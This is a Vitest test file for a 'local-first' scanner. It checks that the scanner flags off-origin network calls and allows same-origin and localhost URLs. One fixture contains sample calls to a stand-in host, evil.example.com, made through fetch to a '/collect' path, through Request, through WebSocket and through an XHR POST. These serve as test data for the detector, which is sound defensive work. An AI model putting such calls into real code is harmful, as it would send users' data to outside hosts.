import { mkdtempSync, mkdirSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { describe, expect, it } from 'vitest';
import { scanLocalFirstViolations } from '../../scripts/quality/verify-local-first';

function createFixtureRoot(code: string): string {
  const root = mkdtempSync(path.join(tmpdir(), 'pt-local-first-'));
  mkdirSync(path.join(root, 'app'), { recursive: true });
  writeFileSync(path.join(root, 'app', 'sample.ts'), code, 'utf8');
  return root;
}

describe('local-first runtime gate patterns', () => {
  it('reports off-origin network usage patterns', () => {
    const root = createFixtureRoot(`
      fetch('https://evil.example.com/collect');
      new Request('https://evil.example.com/request');
      new WebSocket('wss://evil.example.com/ws');
      const xhr = new XMLHttpRequest();
      xhr.open('POST', 'https://evil.example.com/xhr');
    `);

    const violations = scanLocalFirstViolations(root, { runtimeFiles: [] });
    expect(violations.map((item) => item.rule)).toEqual(
      expect.arrayContaining([
        'fetch_off_origin',
        'request_off_origin',
        'websocket_or_eventsource_off_origin',
        'xhr_off_origin',
      ]),
    );
  });

  it('allows same-origin absolute URLs', () => {
    const root = createFixtureRoot(`
      fetch('https://persiantoolbox.ir/api/analytics');
      new Request('https://www.persiantoolbox.ir/api/health');
      new WebSocket('wss://staging.persiantoolbox.ir/socket');
      const xhr = new XMLHttpRequest();
      xhr.open('POST', 'https://localhost:3000/api/analytics');
    `);

    const violations = scanLocalFirstViolations(root, { runtimeFiles: [] });
    expect(violations).toEqual([]);
  });
});
